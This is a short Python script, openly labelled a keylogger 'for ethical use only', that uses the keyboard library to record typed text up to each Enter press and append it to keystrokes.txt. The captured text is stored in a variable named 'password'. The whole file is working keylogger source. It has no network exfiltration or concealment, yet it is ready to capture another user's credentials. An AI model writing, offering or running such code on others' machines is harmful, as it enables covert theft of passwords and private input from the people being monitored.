# Create a simple keylogger that logs keystrokes to a file (ethical use only).

import keyboard

log_file = 'keystrokes.txt'

try:
    while True:
        with open(log_file, 'a') as data_file:
            
            # All key presses are recorded as a list into "events" and the record loop stops when the "enter" key is pressed
            events = keyboard.record('enter')
            password = list(keyboard.get_typed_strings(events))
            
            data_file.write("\n"+password[0])
except KeyboardInterrupt:
    print("CTRL + C: Bye Bye")